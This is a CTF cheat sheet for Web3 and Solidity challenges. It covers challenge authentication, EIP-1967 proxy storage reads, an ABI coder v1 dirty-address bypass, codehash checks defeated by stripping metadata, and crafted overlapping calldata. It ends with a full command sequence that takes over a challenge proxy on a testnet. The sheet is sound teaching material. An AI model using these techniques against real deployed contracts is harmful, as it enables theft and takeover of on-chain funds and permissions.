# CTF Web - Web3 / Blockchain Challenges

## Table of Contents
- [Challenge Infrastructure Pattern](#challenge-infrastructure-pattern)
- [EIP-1967 Proxy Pattern Exploitation](#eip-1967-proxy-pattern-exploitation)
- [ABI Coder v1 vs v2 - Dirty Address Bypass](#abi-coder-v1-vs-v2-dirty-address-bypass)
- [Solidity CBOR Metadata Stripping for Codehash Bypass](#solidity-cbor-metadata-stripping-for-codehash-bypass)
- [Non-Standard ABI Calldata Encoding](#non-standard-abi-calldata-encoding)
- [Solidity bytes32 String Encoding](#solidity-bytes32-string-encoding)
- [Complete Exploit Flow (House of Illusions)](#complete-exploit-flow-house-of-illusions)
- [Web3 CTF Tips](#web3-ctf-tips)

---

## Challenge Infrastructure Pattern

1. **Auth**: GET `/api/auth/nonce` → sign with `personal_sign` → POST `/api/auth/login`
2. **Instance creation**: Call `factory.createInstance()` on-chain (requires testnet ETH)
3. **Exploit**: Interact with deployed instance contracts
4. **Check**: GET `/api/challenges/check-solution` → returns flag if `isSolved()` is true

### Auth Implementation (Python)
```python
from eth_account import Account
from eth_account.messages import encode_defunct
import requests

acct = Account.from_key(PRIVATE_KEY)
s = requests.Session()
nonce = s.get(f'{BASE}/api/auth/nonce').json()['nonce']
msg = encode_defunct(text=nonce)
sig = acct.sign_message(msg)
r = s.post(f'{BASE}/api/auth/login', json={
    'signedNonce': '0x' + sig.signature.hex(),
    'nonce': nonce,
    'account': acct.address.lower()  # Challenge-specific: this server expected lowercase
})
s.cookies.set('token', r.json()['token'])
```

**Key notes:**
- Some CTF servers expect lowercase addresses (not EIP-55 checksummed) — check the frontend JS to confirm. This is NOT universal; other challenges may require checksummed format
- Bundle.js contains chain ID, contract addresses, and auth flow details
- Use `cast` (Foundry) for on-chain interactions: `cast call`, `cast send`, `cast storage`

---

## EIP-1967 Proxy Pattern Exploitation

**Storage slots:**
```
Implementation: keccak256("eip1967.proxy.implementation") - 1
Admin:          keccak256("eip1967.proxy.admin") - 1
```

```bash
cast storage $PROXY 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc  # impl
cast storage $PROXY 0xb53127684a568b3173ae13b9f8a6016e243e63b6e8ee1178d6a717850b5d6103  # admin
```

**Key insight:** Proxy delegates calls to implementation, but storage lives on the proxy. `address(this)` in delegatecall = proxy address.

---

## ABI Coder v1 vs v2 - Dirty Address Bypass

Solidity 0.8.x defaults to ABI coder v2, which validates `address` parameters have zero upper 12 bytes. With `pragma abicoder v1`, no validation.

**Pattern (House of Illusions):**
1. Contract requires dirty address bytes but uses `address` type
2. ABI coder v2 rejects with empty revert data (`"0x"`)
3. Deploy with `pragma abicoder v1` → different bytecode, no validation
4. Swap implementation via proxy's upgrade function

**Detection:** Call reverts with empty data (`"0x"`) = ABI coder v2 validation.

---

## Solidity CBOR Metadata Stripping for Codehash Bypass

Proxy checks `keccak256(strippedCode) == ALLOWED_CODEHASH` where metadata is stripped.

```python
code = bytes.fromhex(bytecode[2:])
meta_len = int.from_bytes(code[-2:], 'big')
stripped = code[:len(code) - meta_len - 2]
codehash = keccak256(stripped)
```

---

## Non-Standard ABI Calldata Encoding

**Overlapping calldata:** When contract enforces `msg.data.length == 100` but has `(address, bytes)` params:
```
Standard: 4 + 32(addr) + 32(offset=0x40) + 32(len) + 32(data) = 132 bytes
Crafted:  4 + 32(dirty_addr) + 32(offset=0x20) + 32(sigil_data) = 100 bytes
```
Offset `0x20` serves dual purpose: offset pointer AND bytes length.

---

## Solidity bytes32 String Encoding

`bytes32("0xAnan or Tensai?")` stores ASCII left-aligned with zero padding:
```
0x3078416e616e206f722054656e7361693f000000000000000000000000000000
```

---

## Complete Exploit Flow (House of Illusions)

```bash
export PATH="$PATH:/Users/lcf/.foundry/bin"
RPC="https://ethereum-sepolia-rpc.publicnode.com"

forge create src/IllusionHouse.sol:IllusionHouse --private-key $KEY --rpc-url $RPC --broadcast
cast send $PROXY "reframe(address)" $NEW_IMPL --private-key $KEY --rpc-url $RPC
cast send $PROXY $CRAFTED_CALLDATA --private-key $KEY --rpc-url $RPC
cast send $PROXY "appointCurator(address)" $MY_ADDR --private-key $KEY --rpc-url $RPC
cast call $FACTORY "isSolved(address)(bool)" $MY_ADDR --rpc-url $RPC
```

---

## Web3 CTF Tips

- **Factory pattern:** Instance = per-player contract. Check `playerToInstance(address)` mapping.
- **Proxy fallback:** All unrecognized calls go through delegatecall to implementation.
- **Upgrade functions:** Check if they have access control! Many challenges leave these open.
- **address(this) in delegatecall:** Always refers to the proxy, not the implementation.
- **Storage layout:** mappings use `keccak256(abi.encode(key, slot))` for storage location.
- **Empty revert data (`0x`):** Usually ABI decoder validation failure.
- **Contract nonce:** Starts at 1. Nonce = 1 means no child contracts created.
- **Derive child addresses:** `keccak256(rlp.encode([parent_address, nonce]))[-20:]`
- **Foundry tools:** `cast call` (read), `cast send` (write), `cast storage` (raw slots), `forge create` (deploy)
- **Sepolia faucets:** Google Cloud faucet (0.05 ETH), Alchemy, QuickNode
